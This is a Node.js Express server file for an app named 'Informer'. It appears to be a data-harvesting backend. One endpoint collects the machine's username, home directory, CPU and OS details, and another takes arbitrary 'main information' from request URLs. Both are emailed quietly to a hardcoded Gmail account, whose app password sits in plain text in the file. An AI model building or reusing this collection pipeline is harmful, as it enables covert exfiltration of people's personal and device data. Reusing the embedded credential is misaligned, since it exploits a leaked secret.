const express = require("express")
// const [MainInfoMail] = require("./controllers/mainInfo")
// const [DeviceInfoMail] = require("./controllers/deviceInfo")
const cors = require("cors")     // use npm cors package when 3000 port not redirect to 8000 port automaticaly
const os = require("os")
const path = require("path")


const nodemailer = require("nodemailer")
var smtpTransport = require('nodemailer-smtp-transport');

var transporter = nodemailer.createTransport(smtpTransport({
    service: 'gmail',
    auth: {
        user: "followbarservice@gmail.com",
        pass: 'jaggxccygqevssre'
        // pass: 'jagg xccy gqev ssre'
    }
}));


const app = express()
app.use(cors())
app.use(express.json())

// app.use("/public", express.static(path.join(__dirname, "public")));   // import during connecting with frontend.
// app.use('*', express.static(path.join(__dirname, "build")));  // import during connecting with frontend.
app.use(express.static(path.join(__dirname, "build")));            // import during connecting with frontend.


// const router = require("./routes/mainRoute")

app.get("/nnp", (req,res) => {
    res.send("/Backend is running for Informer.")
})
app.post("/api/deviceinfo/done/:ID", (req,res) => {
    let data = req.params.ID
    let username = (os.userInfo().username);
    let homeDirectory = (os.userInfo().homedir);
    let processer = (os.cpus()[0].model);
    let architechture = (os.arch());
    let deviceType = (os.type());
    // Email options
    let maildetails = {
        from: "followbarservice@gmail.com",
        to: "followbarservice@gmail.com",
        subject: "Divice Information Recieved",
        html: `
             device Information!!! <br><br>
             want to get no. of----  ${data}<br><br>
             username is---------  ${username}<br><br>
             homeDirectory is------  ${homeDirectory}<br><br>
             processer is--------  ${processer}<br><br>
             architechture is------  ${architechture}<br><br>
             deviceType is--------  ${deviceType}
        `
    }


    // Send email
    transporter.sendMail(maildetails, (error, info) => {
        if (error) {
            console.log('Error occurred:', error);
            res.send('Error occurred, please try again later.');
        } else {
            console.log('Email sent:', info.response);
            res.send('Email sent successfully!');
        }
    });
})

app.post("/api/maininfo/done/:ID", (req,res) => {
    const data = req.params.ID
   
    let maildetails = {
        from: "followbarservice@gmail.com",
        to: "followbarservice@gmail.com",
        subject: "Information recieved",
        html: `
             main information!!! <br><br>
             ${data}
        `
    }


    // Send email
    transporter.sendMail(maildetails, (error, info) => {
        if (error) {
            console.log('Error occurred:', error);
            res.send('Error occurred, please try again later.');
        } else {
            console.log('Email sent:', info.response);
            res.send('Email sent successfully!');
        }
    });
})

app.listen(4000, () => console.log("Server is running at port 4000."))